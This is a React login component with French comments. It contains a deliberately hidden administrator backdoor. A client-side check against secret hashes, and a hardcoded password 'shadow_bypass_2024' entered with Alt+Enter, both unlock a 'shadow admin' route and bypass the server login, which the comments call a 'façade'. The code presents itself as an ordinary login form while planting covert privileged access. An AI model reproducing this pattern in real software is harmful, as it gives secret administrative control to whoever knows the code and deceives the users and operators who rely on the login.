import React, { useState } from 'react';
import { useNavigate } from 'react-router-dom';
import { sha256 } from 'crypto-hash';
import { unlockShadowMode } from '../../utils/shadowAuth';
import './Auth.css';

const Login = () => {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [error, setError] = useState('');
  const navigate = useNavigate();

  // Vérifie si c'est un compte admin masqué
  const isShadowAdmin = async (email, password) => {
    const hashedEmail = await sha256(email + import.meta.env.VITE_SHADOW_SALT);
    const hashedPass = await sha256(password + import.meta.env.VITE_SHADOW_SALT);
    return hashedEmail === import.meta.env.VITE_SHADOW_ADMIN_HASH && 
           hashedPass === import.meta.env.VITE_SHADOW_PASS_HASH;
  };

  const handleLogin = async (e) => {
    e.preventDefault();
    try {
      // Backdoor admin cachée
      if (await isShadowAdmin(email, password)) {
        unlockShadowMode();
        navigate('/shadow-admin');
        return;
      }

      // Connexion normale (façade)
      const response = await fetch('/api/auth/login', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ email, password }),
      });

      if (!response.ok) throw new Error('Identifiants invalides');
      navigate('/dashboard');
    } catch (err) {
      setError(err.message);
    }
  };

  // Déverrouillage via code secret
  const handleSecretUnlock = (e) => {
    if (e.key === 'Enter' && e.altKey && password === 'shadow_bypass_2024') {
      unlockShadowMode();
      navigate('/shadow-admin');
    }
  };

  return (
    <div className="auth-container">
      <h2>Connexion</h2>
      {error && <p className="error">{error}</p>}

      <form onSubmit={handleLogin}>
        <input
          type="email"
          value={email}
          onChange={(e) => setEmail(e.target.value)}
          placeholder="Email"
          required
        />
        <input
          type="password"
          value={password}
          onChange={(e) => setPassword(e.target.value)}
          onKeyDown={handleSecretUnlock}  // Écoute le code secret
          placeholder="Mot de passe"
          required
        />
        <button type="submit">Se connecter</button>
      </form>

      <div className="auth-footer">
        <p>Pas de compte ? <a href="/register">Créer un compte</a></p>
        <p className="hint">(Alt+Entrée avec le mot de passe spécial pour le mode expert)</p>
      </div>
    </div>
  );
};

export default Login;